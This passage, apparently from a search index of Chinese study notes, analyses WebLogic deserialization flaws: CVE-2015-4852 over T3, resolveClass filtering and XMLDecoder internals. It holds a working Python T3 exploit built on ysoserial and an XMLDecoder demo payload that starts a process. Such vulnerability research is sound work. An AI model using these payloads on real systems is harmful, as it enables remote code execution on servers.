\"E:\\\\tools\\\\java\\\\ysoserial-master-d367e379d9-1.jar\" popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE) return popen.stdout.read() def T3Exploit(ip,port,payload): sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.connect((ip,port)) handshake = \"t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\" sock.sendall(handshake.encode()) data = sock.recv(1024) compile = re.compile(\"HELO:(.*).0.false\") match = compile.findall(data.decode()) if match: print(\"Weblogic: \"+\"\".join(match)) else: print(\"Not Weblogic\") #return header = binascii.a2b_hex(b\"00000000\") t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\") desflag = binascii.a2b_hex(b\"fe010000\") payload = header + t3header +desflag+ payload payload = struct.pack(\">I\",len(payload)) + payload[4:] sock.send(payload) if __name__ == \"__main__\": ip = \"127.0.0.1\" port = 7001 gadget = \"CommonsCollections1\" cmd = \"touch /tmp/hack\" payload = generatePayload(gadget,cmd) T3Exploit(ip,port,payload) \u6307\u5b9a\u7aef\u53e3\u548cIP\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6307\u4ee4\u6765\u770b\u662f\u5426\u653b\u51fb\u6210\u529f docker exec weblogic1036jdk7u21 ls tmp/ \u6211\u4eec\u901a\u8fc7\u6293\u53d6\u76f8\u5173\u6d41\u91cf\u5305\u6765\u4e00\u7aa5T3\u534f\u8bae\uff0cwireshark\u8bbe\u7f6etcp.port==7001\uff0c\u6267\u884c\u4ee5\u4e0a\u811a\u672c\uff0c\u6293\u53d6T3\u6d41\u91cf \u53d1\u9001\u7684\u7b2c\u4e00\u4e2a\u5305\u4e3aT3\u534f\u8bae\u5934\uff0ct3\u540e\u9762\u63a5\u7684\u4f7fweblogic\u5ba2\u6237\u7aef\u7248\u672c \u670d\u52a1\u5668\u4f1a\u8fd4\u56de\u5e94\u7b54\uff0c\u5e76\u5728HELO \u540e\u63a5weblogic\u670d\u52a1\u7aef\u7248\u672c\uff0c\u5229\u7528\u8fd9\u4e2a\u7279\u6027\u53ef\u4ee5\u523a\u63a2weblogic\u670d\u52a1\u5668\u7248\u672c \u63a5\u4e0b\u6765\u5ba2\u6237\u7aef\u4f1a\u53d1\u9001\u4e00\u4e2a\u76f8\u5bf9\u6bd4\u8f83\u5927\u7684\u6570\u636e\u5305\uff0c\u5176\u5185\u5bb9\u5206\u6790\u5982\u4e0b \u6570\u636e\u5305\u4ec5\u4e3a\u84dd\u8272\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u7b2c\u4e00\u4e2a\u6846\u4e2d\u662f\u6570\u636e\u5305\u7684\u957f\u5ea6\uff0c\u7b2c\u4e8c\u4e2a\u6846\u662f\u53cd\u5e8f\u5217\u5316\u6807\u5fd7\uff0c\u4e24\u4e2a\u6846\u4e2d\u95f4\u662fT3\u534f\u8bae\u5934\uff0c\u5269\u4e0b\u7684\u4fbf\u662f\u5e8f\u5217\u5316\u6570\u636e\u3002 T3\u534f\u8bae\u53d1\u9001\u5e8f\u5217\u5316\u6570\u636e\u65f6\u6709\u65f6\u5019\u5e76\u4e0d\u53ea\u53d1\u9001\u4e00\u6bb5\u5e8f\u5217\u5316\u6570\u636e\uff0c\u5b83\u53ef\u80fd\u4f1a\u53d1\u9001\u591a\u4e2a\u5e8f\u5217\u5316\u6570\u636e\uff0c\u5f7c\u6b64\u4e4b\u95f4\u4ee5\u53cd\u5e8f\u5217\u5316\u6807\u5fd7\u9694\u5f00\uff0c\u5c31\u50cf\u8fd9\u6837","title":"\u6293\u5305\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#cve-2015-4852","text":"\u6f0f\u6d1e\u7248\u672c 10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0 \u4e0a\u9762\u7684exp\u5c31\u662f\u54ea\u6765\u6253\u8fd9\u4e2a\u6d1e\u7684\uff0c\u4e0a\u8ff0CVE\u7248\u672c\u6ca1\u6709\u5bf9T3\u53cd\u5e8f\u5217\u5316\u5b89\u5168\u95ee\u9898\u505a\u4efb\u4f55\u9632\u8303\uff0c\u5229\u7528T3\u534f\u8bae\u53cd\u5e8f\u5217\u5316CC\u94fe\u3002jdk1.7\uff0cweblogic10.3.6.0 \u7528cc\u94fe1\uff0c3\uff0c6\u90fd\u80fd\u6253\u3002 \u8fd9\u4e2a\u6d1e\u53ef\u4ee5\u8bf4\u662fweblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u6e90\u5934\u4e86\u3002","title":"CVE-2015-4852"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_3","text":"weblogic.rjvm.InboundMsgAbbrev#readObject \u4f5c\u4e3a\u5165\u53e3\u7684readObject\u65b9\u6cd5\u5c31\u5728\u6b64\u5904\uff0c\u5728\u6b64\u4e2d\u8c03\u7528\u4e86InboundMsgAbbrev.ServerChannelInputStream\u7684readObject\u65b9\u6cd5\uff0cvar1\u5373\u662f\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\uff0c\u6211\u4eec\u8fdb\u884c\u4e00\u4e2a\u8ddf\u8fdb InboundMsgAbbrev.ServerChannelInputStream#readObject \u8ddf\u8fdb\u540e\u53d1\u73b0\u6b64\u7c7b\u7ee7\u627f\u81eaObjectInputStream\u4e14\u672a\u91cd\u5199readObject\u65b9\u6cd5 \u4e5f\u5c31\u662f\u8bf4\u5e8f\u5217\u5316\u6570\u636e\u4f20\u5165\u540e\u76f4\u63a5\u4ee5\u53c2\u6570\u7684\u5f62\u5f0f\u4f20\u5165\u4e86ObjectInputStream\u5bf9\u8c61\uff0c\u5e76\u8c03\u7528\u4e86\u5176readObject\u65b9\u6cd5\u3002 \u4e8e\u662f\u4fbf\u7545\u901a\u65e0\u963b\u7684\u89e6\u53d1\u4e86\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","title":"\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#resolveclass","text":"\u8fd9\u91cc\u4e4b\u6240\u4ee5\u8981\u8bf4\u4e00\u4e0bresolveClass\uff0c\u662f\u56e0\u4e3a\u7f51\u4e0a\u5f88\u591aT3\u53cd\u5e8f\u5217\u5316\u76f8\u5173\u6587\u7ae0\u90fd\u63d0\u4e86\u8fd9\u4e2a\u4e1c\u897f\uff0c\u4e5f\u662f\u6211\u4e4b\u524d\u4e0d\u77e5\u9053\u7684\u4e00\u4e2a\u4e1c\u897f\uff0c\u6240\u4ee5\u4fbf\u8bb0\u5f55\u4e00\u4e0b\u3002 resolveClass\u662fObjectInputStream.readObject()\u4e2d\u5fc5\u7ecf\u7684\u4e00\u4e2a\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\uff0c\u5e8f\u5217\u5316\u7684\u6570\u636e\u90fd\u4f1a\u4eceresolveClass\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u7ecf\u8fc7\u4e00\u6b21\u3002 \u8fd9\u4e2a\u65b9\u6cd5\u7684\u4f5c\u7528\u662f\u7c7b\u7684\u5e8f\u5217\u5316\u63cf\u8ff0\u7b26\u52a0\u5de5\u6210\u8be5\u7c7b\u7684Class\u5bf9\u8c61\uff0c\u5f88\u591a\u9488\u5bf9\u53cd\u5e8f\u5217\u5316Gadget\u7684\u62e6\u622a\u90fd\u662f\u901a\u8fc7\u91cd\u5199\u6b64\u65b9\u6cd5\u5b8c\u6210\u7684\uff08\u5982\u901a\u8fc7\u9ed1\u540d\u5355\u6765\u7981\u6b62\u67d0\u7c7b\u53cd\u5e8f\u5217\u5316\uff09 \u8d34\u4e0a\u4e00\u5f20\u5ed6\u5e08\u5085\u7684\u535a\u5ba2\u7684\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u65f6\u5e8f\u56fe\uff1a \u53ef\u4ee5\u770b\u5230\u53cd\u5e8f\u5217\u5316\u62e6\u622a\u4f4d\u7f6e\u9664\u4e86resolveClass\u4ee5\u5916\u8fd8\u6709\u4e00\u4e2aresolveProxyClass\uff0c\u5b83\u7528\u4e8e\u8fd4\u56de\u5b9e\u73b0\u4e86\u4ee3\u7406\u7c7b\u63cf\u8ff0\u7b26\u4e2d\u6240\u6709\u63a5\u53e3\u7684\u4ee3\u7406\u7c7b\uff0c\u8fd9\u91cc\u4e0d\u5bf9\u8be5\u65b9\u6cd5\u5c55\u5f00\u53d9\u8ff0\uff0c\u5b83\u4e5f\u53ef\u4ee5\u88ab\u7528\u4f5c\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u62e6\u622a \u4e0a\u6587\u5728\u5206\u6790CVE-2015-4852\u65f6\uff0cInboundMsgAbbrev.ServerChannelInputStream\u7c7b\u91cd\u5199\u4e86resolveClass\uff0c\u5982\u679c\u91cd\u5199\u5f97\u5f53\u90a3\u4e48\u5c31\u53ef\u4ee5\u8d77\u5230\u7f13\u89e3\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u4f5c\u7528\uff0c\u53ef\u60dc\u8fd9\u4e2a\u7c7b\u76f4\u63a5\u8c03\u7528\u4e86\u7236\u7c7b\u7684resolveClass","title":"resolveClass"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#xmldecoder","text":"XMLDecoder\u662f\u4e00\u5957\u7528\u4e8e\u5bf9XML\u8fdb\u884c\u5e8f\u5217\u5316\u6216\u53cd\u5e8f\u5217\u5316\u7684\u4e00\u5957API\uff0c\u5b83\u5728JDK1.4\u5c31\u5df2\u7ecf\u88ab\u5f00\u53d1\u4e86\u51fa\u6765\uff0c\u5b83\u5bf9XML\u7684\u89e3\u6790\u6a21\u5f0f\u5e76\u4e0d\u662f\u66f4\u4e3a\u4eba\u6240\u77e5\u7684DOM\u89e3\u6790\uff0c\u800c\u662fSAX\u89e3\u6790\u3002 DOM\u89e3\u6790\u5728\u89e3\u6790XML\u65f6\u4f1a\u8bfb\u53d6\u6240\u6709\u6570\u636e\u7136\u540e\u751f\u6210DOM\u6811\u6765\u89e3\u6790\uff0c\u800cSAX\u5219\u662f\u7ebf\u6027\u8bfb\u53d6XML\uff0c\u6240\u4ee5SAX\u89e3\u6790XML\u6027\u80fd\u6d88\u8017\u76f8\u5bf9\u8f83\u5c0f\u3002","title":"XMLDecoder"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#apache-xerces","text":"apache xerces\u662fXMLDecoder\u89e3\u6790XML\u65f6\u7684\u4e00\u4e2a\u91cd\u8981\u7ec4\u4ef6\u3002 apache xerces\u662f\u4e00\u4e2a\u7528\u4e8e\u89e3\u6790XML\u4e2d\u6709\u54ea\u4e9b\u6807\u7b7e\uff0c\u8bed\u6cd5\u662f\u5426\u5408\u6cd5\u7684\u89e3\u6790\u5668\uff0c\u5b98\u65b9\u5728JDK1.5\u4fbf\u96c6\u6210\u4e86\u6b64\u89e3\u6790\u5668\u5e76\u4f5c\u4e3aXML\u7684\u9ed8\u8ba4\u89e3\u6790\u5668\u3002 \u5728XML\u5e8f\u5217\u5316\u6570\u636e\u4f20\u8fbe\u81f3XMLDecoder.readObject() \u65b9\u6cd5\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u7b49\u64cd\u4f5c\u540e\uff0c\u4fbf\u4f1a\u4f20\u9012\u7ed9xerces\u8fdb\u884c\u89e3\u6790\uff0c\u5728xerces\u89e3\u6790\u5b8c\u6bd5\u540e\u6570\u636e\u4fbf\u4f1a\u4ea4\u7ed9DocumentHandler\u5b8c\u6210\u540e\u7eed\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u662fJDK1.6\u4fbf\u4f1a\u4ea4\u7ed9ObjectHandler\u8fdb\u884c\u5904\u7406\u3002","title":"apache xerces"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#documenthandler","text":"DocumentHandler\uff08com.sun.beans.decoder.DocumentHandler\uff09\u5728XMLDecoder\u5904\u7406XML\u6570\u636e\u65f6\u8d77\u5230\u4e8b\u4ef6\u5904\u7406\u5668\u7684\u4f5c\u7528\uff0c\u5b83\u5728JDK1.7\u4e2d\u88ab\u5b9e\u73b0\u3002 \u5b83\u4f1a\u8ddf\u8fdb\u4f20\u5165\u7684XML\u6807\u7b7e\uff0c\u5c5e\u6027\u7b49\u4fe1\u606f\u8c03\u7528\u4e0d\u540c\u7684Handler\u8fdb\u884c\u4e8b\u4ef6\u5904\u7406 \u6211\u4eec\u9488\u5bf9XMLDecoder\u7684\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u4fbf\u662f\u4f20\u5165\u7279\u5b9a\u7684XML\u5e8f\u5217\u5316\u6570\u636e\u7531DocumentHandler\u8fdb\u884c\u4e8b\u4ef6\u5904\u7406\uff0c\u8fdb\u800c\u5b9e\u73b0RCE\u7b49\u653b\u51fb\u3002 \u4e0b\u56fe\u662fjdk1.7 DocumentHandler\u4e2d\u6240\u5b9a\u4e49\u7684\u5404\u79cd\u6807\u7b7e\u7684\u5904\u7406\u529e\u6cd5\u3002 JDK1.6\u4e2d\u4e5f\u6709\u4e2a\u548cDocumentHandler\u529f\u80fd\u7c7b\u4f3c\u7684ObjectHandler\uff0c\u4f46\u662f\u5b83\u5b9e\u73b0\u7684\u6807\u7b7e\u8fdc\u5c11\u4e8eDocumentHandler\uff0c\u4e14\u8fdc\u4e0d\u5982\u5176\u89c4\u8303\u5316\u3002\u4e0b\u56fe\u662fObjectHandler\u7684\u90e8\u5206\u4ee3\u7801\u3002 \u201c\u503c\u5f97\u6ce8\u610f\u7684\u662fCVE-2019-2725\u7684\u8865\u4e01\u7ed5\u8fc7\u5176\u4e2d\u6709\u4e00\u4e2a\u5229\u7528\u65b9\u5f0f\u5c31\u662f\u57fa\u4e8eJDK1.6\u3002\u201d \u4e0b\u9762\u4e3e\u4f8b\u4e00\u4e0b\u5404\u6807\u7b7e\u7684\u4f5c\u7528 string \\ aaa\\ \u7684\u610f\u601d\u5c31\u662f\u8868\u793a\u4e00\u6bb5\u503c\u4e3aaaa\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e2a\u6807\u7b7e\u4e00\u822c\u4e0e\u5176\u4ed6\u6807\u7b7e\u4e00\u8d77\u7528\u6765\u8fbe\u5230\u4e00\u4e9b\u6548\u679c object object\u6807\u7b7e\u8868\u793a\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5176class\u5c5e\u6027\u6307\u5b9a\u7c7b\u540d\uff0cmethod\u5c5e\u6027\u6307\u5b9a\u67d0\u65b9\u6cd5\u540d\uff08\u6784\u9020\u65b9\u6cd5\u65b9\u6cd5\u540d\u4e3anew\uff09 \u5982 new A(\"test\"); \u7684xml\u6587\u6863\u8868\u73b0\u4e3a <object class=\"A\" method=\"new\"> <string>test</string> </object> void void\u4e00\u822c\u4e0e\u5176\u4ed6\u6807\u7b7e\u642d\u914d\u4f7f\u7528\uff0c\u5b83\u4e5f\u6709method\uff0cclass\u7b49\u5c5e\u6027\uff0c\u4e8e\u662f\u5b83\u548cobject\u6807\u7b7e\u5341\u5206\u76f8\u50cf\u3002 void\u4e00\u822c\u7528\u4e8e\u51fd\u6570\u8c03\u7528\u5e76\u901a\u8fc7method\u5c5e\u6027\u6307\u5b9a\u65b9\u6cd5\u540d\uff0c\u4ee5\u53ca\u5176\u4ed6\u8f85\u52a9\u4f5c\u7528\uff08\u5982array\u6807\u7b7e\u4e2d\u5145\u5f53\u7d22\u5f15\uff09 \u5982A a = new A(); A.foo(\"test\"); \u7684xml\u6587\u6863\u8868\u73b0\u4e3a <object class=\"A\"> <void method=\"foo\"> <string>test</string> </void> </object> array array\u6807\u7b7e\u7528\u4e8e\u8868\u793a\u6570\u7ec4\uff0cclass\u5c5e\u6027\u6307\u5b9a\u7c7b\u540d\uff0c\u5185\u90e8\u901a\u8fc7void\u6807\u7b7e\u7684index\u5c5e\u6027\u8bbe\u7f6e\u7d22\u5f15 \u5982 String[] a = new String[];s[1]=\"test\" \u7684xml\u8868\u73b0\u5f62\u5f0f\u4e3a <array class=\"java.lang.String\"> <void index=\"1\"> <string>test</string> </void> </array>","title":"DocumentHandler"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_4","text":"\u4e0d\u540c\u7684XML\u6807\u7b7e\u5bf9\u5e94\u7740\u4e0d\u540c\u7684handler\uff0c\u4e5f\u5c31\u5bf9\u5e94\u7740\u4e0d\u540c\u7684\u5904\u7406\u673a\u5236\u3002 \u5927\u591a\u6570handler\u90fd\u6709addAttribute\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u63d0\u53d6\u6807\u7b7e\u4e2d\u7684\u5c5e\u6027\u5e76\u8fdb\u884c\u5904\u7406\uff1b \u4ee5\u53cagetValueObject\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u83b7\u53d6\u6807\u7b7e\u7684\u503c\u3002 \u9996\u5148\u4ee5java\u6807\u7b7e\u4e3a\u4f8b\uff1avar1\u5bf9\u5e94\u7740\u5c5e\u6027\u540d\uff0cvar2\u5bf9\u5e94\u7740\u5c5e\u6027\u503c\u3002java\u6807\u7b7e\u4f1a\u6839\u636eclass\u5c5e\u6027\u4e2d\u7684\u503c\u8fdb\u884c\u7c7b\u52a0\u8f7d\u3002 \u518d\u6765\u770b\u770bNew\u6807\u7b7e\uff1a\u548cjava\u6807\u7b7e\u7684handler\u7c7b\u4f3c\uff0c\u5b83\u4e5f\u4f1a\u8fdb\u884c\u7c7b\u52a0\u8f7d\u64cd\u4f5c\uff0c\u4e0d\u8fc7NewElementHandler\u662f\u8bb8\u591ahandler\u7684\u7236\u7c7b\uff08\u5982ArrayElementHandler\uff0cObjectElementHandler\uff09\uff0c\u8fd9\u5c31\u610f\u5473\u7740NewElementHandler\u7684\u5b50\u7c7b\u4e5f\u53ef\u4ee5\u8fdb\u884c\u7c7b\u52a0\u8f7d \u5728\u4e0a\u6587\u4e2d\u63d0\u5230object\u6807\u7b7e\u6709\u8fdb\u884c\u7c7b\u52a0\u8f7d\u7684\u80fd\u529b\uff0c\u662f\u56e0\u4e3a\u5176class\u5c5e\u6027\u662f\u7531\u7236\u7c7bNewElementHandler\u8fdb\u884c\u5904\u7406\u7684\u3002 \u800cvoid\u6807\u7b7e\u4e4b\u6240\u4ee5\u548cobject\u6807\u7b7e\u5982\u6b64\u76f8\u50cf\u7684\u539f\u56e0\u662f\uff0cVoidElementHandler\u7ee7\u627f\u81eaObjectElementHandler\uff0c\u4e14\u4ec5\u91cd\u5199\u4e86\u4e00\u4e2aisArgument\u65b9\u6cd5\uff0c\u5176\u5b83\u90fd\u548c\u7236\u7c7b\u4e00\u6837\u3002 \u518d\u6765\u770b\u770barray\uff0c\u5b83\u4e5f\u662f\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u6807\u7b7e","title":"\u5de5\u4f5c\u539f\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#demo","text":"\u4ece\u4e0a\u6587\u5927\u6982\u77e5\u9053XMLDecoder\u5904\u7406xml\u7684\u6d41\u7a0b\u4e3a :XMLDecoder.readObject() ->xerces\u89e3\u6790->DocumentHandler\u4e8b\u4ef6\u5904\u7406\uff0c\u90a3\u4e0d\u5982\u5199\u4e2aDemo\u8c03\u8bd5\u4e00\u4e0b\u770b\u770b\u5177\u4f53\u8fc7\u7a0b\u5982\u4f55 import java.beans.XMLDecoder; import java.io.*; public class Main { public static void main(String[] args) throws FileNotFoundException { String s = \"<java version=\\\"1.7.0_80\\\" class=\\\"java.beans.XMLDecoder\\\">\\n\" + \" <object class=\\\"java.lang.ProcessBuilder\\\">\\n\" + \" <array class=\\\"java.lang.String\\\" length=\\\"1\\\">\\n\" + \" <void index=\\\"0\\\"><string>calc</string></void>\\n\" + \" </array>\\n\" + \" <void method=\\\"start\\\"></void>\\n\" + \" </object>\\n\" + \"</java>\"; StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s); XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream); Object o = xmlDecoder.readObject(); System.out.println(o); } } \u76f4\u63a5\u5f00\u59cb\u52a8\u8c03\uff0c\u5728demo\u4e2dxmlDecoder.readObject() \u5904\u4e0b\u65ad\u70b9\u3002\u8ddf\u8fdb\u3002","title":"Demo\u8c03\u8bd5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#readobject","text":"\u8ddf\u8fdbreadObject,\u53ef\u4ee5\u53d1\u73b0\u8c03\u7528\u4e86parsingComplete(),\u7ee7\u7eed\u8ddf\u8fdb java.beans.XMLDecoder#parsingComplete, \u56e0\u4e3a\u6211\u4eec\u8ddf\u8e2a\u7684\u662f\u5bf9XML\u7684\u89e3\u6790\u8fc7\u7a0b\uff0c\u6240\u4ee5\u8fd9\u4e2aparse\u65b9\u6cd5\u5c31\u5f88\u53ef\u7591\uff0c\u800c\u4e14\u53c8\u56e0\u4e3a\u662f\u53ef\u8ddf\u8fdb\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5bf9\u5176\u8fdb\u884c\u4e00\u4e2a\u8ddf\u8fdb com.sun.beans.decoder.DocumentHandler#parse,\u53c8\u53d1\u73b0\u4e00\u4e2aparse\uff0c\u8ddf\u8fdb com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse,\u53c8\u627e\u5230\u4e00\u4e2aparse\uff0c\u8ddf\u8fdb com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse\uff0c\u53d1\u73b0\u8ddf\u8fdb\u6765\u7684\u8fd9\u4e2aparse\u662f\u91cd\u8f7d\u65b9\u6cd5\uff0c\u5728\u5176\u4e2d\u53c8\u53d1\u73b0\u4e86parse\uff0c\u518d\u8ddf com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser#parse,\u53d1\u73b0parse\uff0c\u53c8\u8ddf com.sun.org.apache.xerces.internal.parsers.XMLParser#parse com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse,\u4e0a\u4e00\u4e2aparse\u7684\u91cd\u8f7d\uff0c\u5176\u4e2d\u8c03\u7528\u4e86\u4e00\u4e2a\u53ebscanDocument\u7684\u65b9\u6cd5 \u8ddf\u8fdbscanDocument\uff0c\u5230\u8fd9\u91cc\u5c31\u5df2\u7ecf\u8fdb\u5165\u4e86xerces\u89e3\u6790\u4e86\u3002\u8fd9\u91cc\u6709\u4e2ado..while\u5faa\u73af\uff0c\u4f5c\u7528\u662f\u63d0\u53d6XML\u6807\u7b7e \u8c03\u7528\u94fe:","title":"readObject"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#scandocument","text":"\u6211\u4eec\u6765\u770b\u4e00\u4e0bscanDocument\u8fd9\u4e2a\u65b9\u6cd5\u3002 \u8fd9\u91cc\u5faa\u73af\u6267\u884c\u4e86next()\u65b9\u6cd5\uff0c\u5728\u524d\u5341\u51e0\u4e2a\u5faa\u73af\u91cc\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5bf9XML\u8fdb\u884c\u4e86\u89e3\u6790\u548c\u4e8b\u4ef6\u5904\u7406\u3002\u5927\u81f4\u7684\u5904\u7406\u6d41\u7a0b\u662f\u5bf9\u6bcf\u4e00\u4e2a\u89e3\u6790\u5230\u7684\u6807\u7b7e\u5148\u5b9e\u4f8b\u5316\u5bf9\u5e94\u7684handler\uff0c\u7136\u540e\u5faa\u73af\u8c03\u7528addAttribute\u65b9\u6cd5\u83b7\u53d6\u5176\u6240\u6709\u5c5e\u6027\u5e76\u8fdb\u884c\u4e00\u5b9a\u7684\u4e8b\u4ef6\u5904\u7406\uff0c\u5f53\u89e3\u6790\u5230\u67d0\u4e2a\u6807\u7b7e\u7684\u7ed3\u675f\u6807\u7b7e\u65f6(\u5982\\ ) \u4fbf\u4f1a\u8c03\u7528getValueObject \u83b7\u53d6\u6807\u7b7e\u4e2d\u7684\u503c\u7684\u4fe1\u606f\u3002\u8fd9\u91cc\u501f\u7528\u4e00\u4e2a\u56fe public boolean scanDocument(boolean complete) throws IOException, XNIException { this.fEntityManager.setEntityHandler(this); int event = this.next(); do { switch(event) { case 1: case 2: case 6: .................. case 12: this.fDocumentHandler.startCDATA((Augmentations)null); this.fDocumentHandler.characters(this.getCharacterData(), (Augmentations)null); this.fDocumentHandler.endCDATA((Augmentations)null); event = this.next(); \u4e0b\u9762\u7684\u8c03\u8bd5\u6211\u5bf9XML\u4e2d\u6240\u6d89\u53ca\u7684\u6240\u6709handler\u7684\u6240\u6709\u65b9\u6cd5\u5747\u4e0b\u4e86\u65ad\u70b9\u4ee5\u65b9\u4fbf\u8c03\u8bd5\u3002 